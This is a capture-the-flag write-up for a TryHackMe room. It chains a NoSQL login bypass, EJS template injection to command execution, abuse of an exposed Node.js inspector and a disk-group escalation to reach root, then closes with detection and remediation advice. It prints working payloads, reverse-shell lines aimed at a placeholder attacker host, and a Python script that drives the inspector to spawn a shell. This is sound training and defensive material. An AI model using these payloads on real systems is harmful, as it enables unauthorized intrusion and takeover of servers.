# Byte Lotus: Poolside

**Platform:** TryHackMe
**Difficulty:** Medium
**Category:** Boot2Root / Web
**Tags:** NoSQL injection, EJS SSTI, Node.js inspector abuse, `disk` group privesc

> *"A session goes warm on a sunbed, and a stranger sits down in it."*

A full chain from an unauthenticated web login to root, walking through a NoSQL auth bypass, server-side template injection, lateral movement via an exposed Node.js debug inspector, and a final privilege escalation through raw disk access.

> **Note:** Flag values are redacted (`THM{REDACTED}`). This writeup documents the full methodology so you can reproduce each step on your own instance and recover the flags yourself. If you're actively working this room, try it independently before reading on.

---

## Summary

| Stage | Vulnerability | Result |
|-------|--------------|--------|
| Initial access | NoSQL injection auth bypass (`$ne`) | Valid staff session |
| User flag | EJS Server-Side Template Injection → RCE | Shell as `poolside` |
| Lateral movement | Node.js `--inspect` debugger exposed on localhost | Code execution as `pipelinesvc` |
| Root | `disk` group membership → raw block-device access | Root flag via `debugfs` |

---

## 1. Reconnaissance

### Port scan

A full TCP sweep showed only two open ports:

```
nmap -p- --min-rate 1000 -T4 <TARGET> -oN nmap-allports.txt
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Service detection on the two open ports:

```
nmap -sC -sV -p 22,80 <TARGET> -oN nmap-services.txt
```

```
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    Node.js (Express middleware)
|_http-title: Byte Lotus: Poolside
```

Port 80 is a Node.js/Express app. That's the entry point.

### Content discovery

```
gobuster dir -u http://<TARGET>/ -w directory-list-2.3-medium.txt -x php,html,txt -t 50
```

```
/staff    (Status: 403)
/logout   (Status: 302) --> /
```

The homepage is a login form posting to `/login`. `/staff` exists but is gated (403), and `/logout` confirms a real session mechanism is in play. No exposed source, `.git`, or JS assets were found.

---

## 2. Initial Access: NoSQL Injection

A failed login returned `401` with no `Set-Cookie`, meaning a session is only issued on success. Standard credential guessing failed, but the app also accepted a JSON body.

Testing a MongoDB operator injection in the JSON login:

```bash
curl -s -i -X POST http://<TARGET>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}'
```

```
HTTP/1.1 200 OK
Set-Cookie: connect.sid=s%3A...; Path=/; HttpOnly
```

The backend passed the request body straight into a query like `db.findOne({ username, password })`. The `$ne` (not-equal) operator matches the first user in the collection, bypassing authentication entirely and returning a valid session as `attendant`.

> **Note:** `{"username":"admin","password":{"$ne":"x"}}` returned `401`, confirming there is no `admin` user: the object-operator injection matched whichever account came first instead.

Saving the session cookie:

```bash
curl -s -c cookies.txt -X POST http://<TARGET>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":"x"},"password":{"$ne":"x"}}' -o /dev/null
```

`/staff` now returned the **Cabana Desk** staff console.

---

## 3. User Flag: EJS Template Injection

The staff console exposed a "confirmation template" feature that rendered user-supplied input as an **EJS** template and POSTed it to `/staff/preview`:

```html
<textarea name="template">Dear <%= guest %>, your Byte Lotus cabana is confirmed.</textarea>
```

User-controlled EJS is a direct Server-Side Template Injection. Confirming evaluation:

```bash
curl -s -b cookies.txt -X POST http://<TARGET>/staff/preview \
  --data-urlencode 'template=Result: <%= 7*7 %>'
# -> Result: 49
```

EJS runs inside Node, so the template can reach `child_process` for full command execution:

```bash
curl -s -b cookies.txt -X POST http://<TARGET>/staff/preview \
  --data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("id").toString() %>'
# -> uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

Reading the user flag directly through the RCE:

```bash
curl -s -b cookies.txt -X POST http://<TARGET>/staff/preview \
  --data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("cat /home/*/user.txt; ls -la /home; whoami").toString() %>'
```

```
THM{REDACTED}
```

```
drwxr-x--- pipelinesvc pipelinesvc  pipelinesvc
drwxr-x--- poolside    poolside     poolside
drwxr-xr-x ubuntu      ubuntu       ubuntu
```

**User flag:** `THM{REDACTED}`: run the command above on your own instance to retrieve it.

A reverse shell was then established for easier enumeration:

```bash
# listener on attack box
nc -lvnp 4444

# via SSTI
curl -s -b cookies.txt -X POST http://<TARGET>/staff/preview \
  --data-urlencode 'template=<%= process.mainModule.require("child_process").execSync("bash -c \"bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1\"").toString() %>'
```

---

## 4. Lateral Movement: Node.js Inspector Abuse

As `poolside`:

- `sudo -l` required a password (not available).
- No custom SUID binaries.
- The home listing revealed a second service account, `pipelinesvc`.

Enumerating files owned by `pipelinesvc` pointed at a running service:

```
/sys/fs/cgroup/system.slice/lotus-telemetry.service/memory.pressure
/opt/pipelinesvc/telemetry
```

Inspecting the systemd unit:

```bash
systemctl cat lotus-telemetry.service
```

```ini
[Service]
Type=simple
User=pipelinesvc
Group=pipelinesvc
WorkingDirectory=/opt/pipelinesvc/telemetry
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

The service runs Node with **`--inspect=127.0.0.1:9229`**. The Node.js Inspector Protocol allows arbitrary JavaScript execution inside the running process for anyone who can reach that port. It's bound to localhost, but we already have local code execution as `poolside`.

Confirming the inspector and retrieving the debugger WebSocket URL:

```bash
ss -tlnp | grep 9229
# LISTEN 127.0.0.1:9229

curl -s http://127.0.0.1:9229/json
# "webSocketDebuggerUrl": "ws://127.0.0.1:9229/<uuid>"
```

Driving the inspector via `Runtime.evaluate` over the WebSocket to spawn a shell as `pipelinesvc`. A minimal WebSocket client (Python, standard library only) sends the debug command. Using a **detached, non-blocking** `spawn` is important: a blocking `execSync` reverse shell freezes the Node event loop and hangs the service.

```python
import socket, base64, os, json, struct
WS_HOST, WS_PORT = "127.0.0.1", 9229
WS_PATH = "/<uuid>"   # from webSocketDebuggerUrl

js = ("process.mainModule.require('child_process')"
      ".spawn('bash',['-c','bash -i >& /dev/tcp/<ATTACKER>/4445 0>&1'],"
      "{detached:true,stdio:'ignore'}).unref()")
cmd = "(function(){" + js + ";return 'fired'})()"

key = base64.b64encode(os.urandom(16)).decode()
s = socket.create_connection((WS_HOST, WS_PORT))
s.send(("GET %s HTTP/1.1\r\nHost:%s:%d\r\nUpgrade:websocket\r\n"
        "Connection:Upgrade\r\nSec-WebSocket-Key:%s\r\n"
        "Sec-WebSocket-Version:13\r\n\r\n"
        % (WS_PATH, WS_HOST, WS_PORT, key)).encode())
s.recv(4096)

def send(o):
    d = json.dumps(o).encode(); m = os.urandom(4); ln = len(d); h = b'\x81'
    if ln < 126:      h += struct.pack('B', 0x80 | ln)
    elif ln < 65536:  h += struct.pack('B', 0x80 | 126) + struct.pack('>H', ln)
    else:             h += struct.pack('B', 0x80 | 127) + struct.pack('>Q', ln)
    h += m
    s.send(h + bytes(b ^ m[i % 4] for i, b in enumerate(d)))

send({"id": 1, "method": "Runtime.evaluate", "params": {"expression": cmd}})
print(s.recv(8192).decode(errors="ignore"))
```

Running this landed a shell on the `4445` listener:

```
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

> **Gotcha:** `Runtime.evaluate` shares one global scope across calls, so re-declaring `const cp` throws `Identifier 'cp' has already been declared`. Wrapping the payload in an IIFE and avoiding top-level `const` sidesteps this. Also, `require` is not defined in the raw inspector scope: `process.mainModule.require` works instead.

---

## 5. Privilege Escalation: `disk` Group

The `id` output for `pipelinesvc` contained the key:

```
groups=995(pipelinesvc),6(disk)
```

Membership in the **`disk`** group grants read/write access to the raw block devices under `/dev`. This effectively bypasses filesystem permissions: any file on disk can be read or written directly, including files owned by root.

Identifying the root filesystem device:

```bash
lsblk
```

```
nvme0n1p1 259:1  0  20G  0 part /
```

Using `debugfs` (an ext filesystem debugger) to read root-owned files straight off the block device: no root shell required:

```bash
debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
```

```
THM{REDACTED}
```

**Root flag:** `THM{REDACTED}`: run the command above on your own instance to retrieve it.

---

## Attack Chain

```
Unauth  →  NoSQL $ne bypass      →  session as attendant
        →  EJS SSTI              →  RCE / shell as poolside   [user flag]
        →  Node --inspect abuse  →  code exec as pipelinesvc
        →  disk group + debugfs  →  root file read            [root flag]
```

---

## Defensive Takeaways (Blue Team)

Each stage of this chain leaves detectable artifacts: useful for mapping offensive techniques to detection engineering:

- **NoSQL injection**: the login request carries a malformed/object-typed body instead of strings. Input validation (reject non-string credential fields) kills this; at detection time, a login body containing `$ne`/`$gt`/`$regex` is a high-fidelity signal.
- **SSTI → RCE**: the Node web process spawns an unexpected child (`bash`, `sh`, `id`). Process-lineage monitoring (web server spawning a shell) is a classic EDR/Wazuh rule.
- **Reverse shells**: outbound `/dev/tcp` connections from a server process to an unusual host/port. Egress filtering and Suricata flow alerts catch these.
- **Node inspector**: a localhost connection to `:9229` and any Node process launched with `--inspect` in production is a misconfiguration. Never expose the debugger in production; bind nothing to the inspector.
- **`disk` group**: treat `disk`, `docker`, `lxd`, `shadow`, and `sudo` group membership as equivalent to root. Audit group membership for service accounts; `pipelinesvc` had no business in `disk`.

---

## Remediation

| Finding | Fix |
|---------|-----|
| NoSQL injection | Validate/cast credential fields to strings; use parameterized queries; enforce schema validation. |
| EJS SSTI | Never render user input as a template. Treat templates as code, data as data (pass `guest` as a variable, don't concatenate user input into the template body). |
| Exposed Node inspector | Remove `--inspect` from production `ExecStart`. If debugging is needed, bind to a firewalled socket and require auth. |
| `disk` group membership | Remove service accounts from privileged groups. Apply least privilege to systemd `User=`/`Group=`. |
